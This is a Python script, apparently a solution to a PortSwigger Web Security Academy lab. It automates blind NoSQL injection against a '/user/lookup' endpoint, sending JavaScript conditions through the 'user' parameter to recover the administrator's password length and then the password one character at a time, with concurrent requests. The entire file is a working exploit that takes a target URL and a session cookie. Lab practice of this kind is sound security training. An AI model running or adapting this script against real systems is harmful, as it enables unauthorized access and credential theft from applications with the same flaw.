#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import string
from typing import Any


# Maximum number of concurrent condition checks
CONCURRENCY = 20


def build_query(expr: str) -> str:
    """Build the URL query that injects a JavaScript expression."""
    return f"?user=administrator'%26%26{expr}"


async def check_condition(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    condition: str,
) -> bool:
    """Check if a JavaScript condition is true by inspecting the response."""
    headers = {"Cookie": f"session={session}"}
    try:
        async with client.get(url + condition, headers=headers, ssl=False) as res:
            json_response = await res.json()
            return "Could not find user" not in str(json_response)
    except aiohttp.ClientConnectorError:
        pass
    except aiohttp.ClientError as e:
        print(f"[-] Error checking condition '{condition}': {e}")
    return False


async def find_true(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    candidates: list[tuple[Any, str]],
) -> Any | None:
    """Run candidate (value, condition) pairs concurrently; return the value of the first true condition."""
    semaphore = asyncio.Semaphore(CONCURRENCY)
    found = asyncio.Event()
    result = None

    async def check(candidate: tuple[Any, str]) -> None:
        nonlocal result
        value, condition = candidate
        if found.is_set():
            return
        async with semaphore:
            if await check_condition(client, url, session, condition):
                result = value
                found.set()

    await asyncio.gather(*(check(c) for c in candidates))
    return result


async def get_password_length(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    max_length: int = 30,
) -> int:
    """Determine the password length."""
    candidates = [
        (length, build_query(f"this.password.length=='{length}"))
        for length in range(1, max_length + 1)
    ]
    length = await find_true(client, url, session, candidates)
    if length:
        print(f"[+] Password length: {length}")
    return length or 0


async def extract_password(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    password_length: int,
    chars: str = string.digits + string.ascii_letters,
) -> str:
    """Extract password character by character."""
    password = ""
    for pos in range(password_length):
        candidates = [
            (char, build_query(f"this.password[{pos}]=='{char}"))
            for char in chars
        ]
        char = await find_true(client, url, session, candidates)
        if char is None:
            print(f"[-] Could not find character at position {pos}")
            break
        password += char
        print(f"[+] Position {pos}: '{char}' → {password}")
    return password


async def main():
    parser = argparse.ArgumentParser(
        description="Solve Lab: Exploiting NoSQL injection to extract data"
    )
    parser.add_argument(
        "-u", "--url", type=str, required=True,
        help="URL of the PortSwigger lab (e.g. https://YOUR-LAB-ID.web-security-academy.net)",
    )
    parser.add_argument(
        "-s", "--session", type=str, required=True,
        help="Session cookie value",
    )

    args = parser.parse_args()
    url = args.url.rstrip("/") + "/user/lookup"
    session = args.session.strip()

    async with aiohttp.ClientSession(trust_env=True) as client:
        # Step 1: Determine password length
        print("[*] Determining password length...")
        pw_length = await get_password_length(client, url, session)

        if pw_length == 0:
            print("[-] Could not determine password length. Exiting.")
            return

        # Step 2: Extract password character by character
        print(f"[*] Extracting {pw_length}-character password...")
        password = await extract_password(client, url, session, pw_length)

        if password:
            print(f"\n[+] Administrator password: {password}")
        else:
            print("[-] Failed to extract password.")


if __name__ == "__main__":
    asyncio.run(main())
